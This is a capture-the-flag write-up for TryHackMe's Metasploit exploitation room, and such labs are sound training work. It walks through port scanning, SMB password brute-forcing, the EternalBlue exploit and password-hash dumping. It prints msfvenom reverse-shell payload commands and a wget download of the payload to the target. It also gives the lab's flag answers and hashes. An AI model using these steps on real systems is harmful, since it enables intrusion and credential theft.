# Metasploit: Exploitation

## Scanning (Task 2)


### How many ports are open on the target system?

    5
    
* Give `search portscan` command 

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/f7a47352-4d3a-47fe-a2e3-7188cdbf9b85)

* In the given modules, select `auxiliary/scanner/portscan/tcp` module
* set the remote hosts by using `set rhosts <ip>`. In my case `set rhosts 10.10.165.232`
* Give command `run`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/f91a9713-76ef-464f-a11e-d125e14159c4)

### Using the relevant scanner, what NetBIOS name can you see?

    ACME IT SUPPORT
    
* Search for NetBIOS command by using `search netbios`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/2d704485-fdfb-43dd-b534-9844f0c5c87a)

* In the given modules, select `auxiliary/scanner/netbios/nbname` module.
* set the remote hosts by using `set rhosts <ip>`. In my case `set rhosts 10.10.165.232`
* Give command `run`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/42764ce4-831f-4d75-a46f-a9554ac98075)

### What is running on port 8000?

    webfs/1.21
      
* TCP Port 8000 is commonly used for development environments of web server software
* Thus, we will look for http connection.
* search for `http_version` module.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/01ccaa39-1a16-4b7a-ba8d-e0420f7b2e4c)

* In the given modules, select `auxiliary/scanner/http/http_version` module.
* set the remote hosts by using `set rhosts <ip>`. In my case `set rhosts 10.10.165.232`
* set `rport` to `8000` as we're looking for 8000 port.
* Give command `run`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/ca876317-4462-430c-a7bc-d1a895044ee6)

### What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task

    leo1234
    
* As we're looking for SMB password, we will search for module `smb login` by using `search smb login`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/b175cee1-e8a8-402f-a7d9-a6dde51c823b)

* We can see a module named `auxiliary/scanner/smb/smb_login` suitable for our task and we will select it by using `use` command.
* If we give `show options` command, we can see the `SMBPass` & `SMPUser` fields.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/5f76d38d-42e1-494e-ba60-2898064e845b)

* set `rhosts`
* set `SMBUser` as `penny`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/5429b995-15f2-4e74-a8c9-d273852023a8)

* Give the worlists file to `PASS_FILE`
* `set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`
* Give `run` command.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/128cd24d-9e1e-4e79-9666-0218a7eea922)

We got one success password which is the password of user `penny`

## Metasploit Database (Task 3)

We can check database status connecting to postgresql by using command `db_status`.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/7ef490b2-9407-46f1-93ed-cee9942b7d68)

The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the `workspace` command.

`-a` to add workspace and `-d` to delete the workspace

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/3fcb60e5-6810-427e-895b-bd350cccbba1)

If we run a Nmap scan using the `db_nmap` , all results will be saved to the database. 

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/62e045cb-6e3f-48ca-9b41-4cbbae15c61b)

`hosts` command is used to list the hosts.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/84a9368e-cee7-4f02-adfb-d5abff19fbd0)

## Vulnerability Scanning (Task 4)


### Who wrote the module that allows us to check SMTP servers for open relay?

        Campbell Murray
        
* Search for SMTP open relay module by giving command `search smtp open relay`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/adb811ef-5c40-493f-acf5-7d51c4feb877)

* select the `auxiliary/scanner/smtp/smtp_relay` module by using `use` command.
* give `info` command for the details of the module.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/9cdc4e38-deb5-4d67-a00f-51cc58059b56)

There we got the name of who provided this module.

### Exploitation (Task 5)

### Exploit one of the critical vulnerabilities on the target VM?

        MS17-010
        
* Use `windows/smb/ms17_010_eternalblue` module to find out vulnerabilities.
* Give `rhosts` of your ip. In this case, `set rhosts 10.10.201.11` 
* Give `exploit` command to run this exploit.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/c1e71dc1-6ca5-4a70-b8a5-989ed9d6a8bf)

As we can see in above image, it showed `Host is likely vulnerable to MS17-010!` of `EternalBlue` module.

### What is the content of the flag.txt file?

        THM-5455554845
        
* From previous task, we already expolited using `EternalBlue` module. After the exploit gets executed, it will go to `meterpreter` 
* As we have to look for a file flag.txt, we will use `search` command.
* `search -f flag.txt` command is executed.
* `-f` flag refers that we're giving a file name.
* After executing the command, we will get the location of the file.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/20644377-633d-4d55-b32f-24af544cfb11)

* Display the contents of file by using `cat` command.
* `cat c:/Users/Jon/Documents/flag.txt`
* Make sure that we use backward slash instead of forward slash which is shown in output.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/96953e1f-31a3-4290-9400-30eb02b31c43)

### What is the NTLM hash of the password of the user "pirate"?

        8ce9a3ebd1647fcc5e04025019f4b875
        
* Once we gain system privileges, we can quickly figure out the login password hashes from the compromised system by using the `hashdump` command
* In hashdump command output, see the password hash of the user `private`
* Look at the 4th column for the password hash.
 
![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/c7b8ab2e-2fe5-4055-9b97-22e056f845f2)

## Msfvenom (Task 6)

Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads

Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

`msfvenom -l payloads`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/7e7d36c0-e4f9-488d-ad46-2e37cad69321)

`msfvenom --list formats` will list supported output formats.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/7d09d021-7c6c-471c-a512-d2247d2e8b85)

### Encoders

Encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/1bb27eec-9de2-45ba-8454-23becc842000)

### Reverse payloads 

    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf   // Linux
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe     // Windows
    msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php         // PHP
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp     // ASP
    msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py              // Python

### Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/01b0f0be-3f5e-490d-809d-4c2df6800133)

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/c0e24eda-62ff-49ec-9749-b263d2194511)

### Create a meterpreter payload in the .elf format

    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.52.213 LPORT=8282 -f elf > rev_shell.elf

* Open `msfconsole` in the terminal.
* Give the above payload to create a meterpreter payload.
* We can see the file `rev_shell.elf` is created.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/1601c801-aed1-42f7-a926-fc30b434c918)

### Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_10.10.52.213:9000/shell.elf to download it to the target machine).

* Start a python web server on the attacking machine by running command `python3 -m http.server 9000`.
* Open the SSH window we logged in before and download the file by using command. `wget http://<attacker machine ip>:9000/rev_shell.elf`. In my case, `wget http://10.10.36.117:9000/rev_shell.elf`.
* File gets downloaded.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/028b178d-5f78-4028-9e13-b10776e3edc0)

* We can see the file sent acknowledgement can be seen at python web server tab.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/0f3d459e-052b-4aa6-9d7e-9a278da70e12)

### Get a meterpreter session on the target machine.

* Give executable permission to the .elf file payload by using command `chmod +x rev_shell.elf `.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/d43cd286-eb23-411b-b105-254e59acad93)

Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. We need a handler running. We can select the `multi/handler` module by searching for it and selecting it.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/faed987e-9456-4f8b-910a-2185f82f87dd)

* Select payload by giving command `set payload linux/x86/meterpreter/reverse_tcp`
* Give `lport` and `lhosts` values

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/13b86121-e0d2-45a9-98c1-5b4869a9f6db)

Now run the handler, followed up by running the exploit on the target machine by writing `./rev_shell.elf`. You should have a reverse shell.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/db1111e5-a4f7-447a-98a5-24aacde7c2db)

Give `ls` command to check reverse shell worked or not.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/a0387166-6ea2-42e2-a805-3415db0970f8)

### Use a post exploitation module to dump hashes of other users on the system.

To find the hash of users, we will use `hashdump` command. But it works for Windows machines only and we are dealing with linux machine here.

* Search for the linux dump module.
* Use the module that we got in result.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/748b1f3e-5a9a-4185-9307-c3cda14bc213)

* So we got to find out that there is a module that gives us hexdump for liux machine, which is `post/linux/gather/hashdump`
* Run the command `run post/linux/gather/hashdump` in the meterpreter we exploited.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/54ff591d-55ef-4ad7-91d8-528a34368b72)

Thus we got the password hash of other users.

### What is the other user's password hash?

    $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0
    
As per the above image, look for hash of other user which is `claire`. 
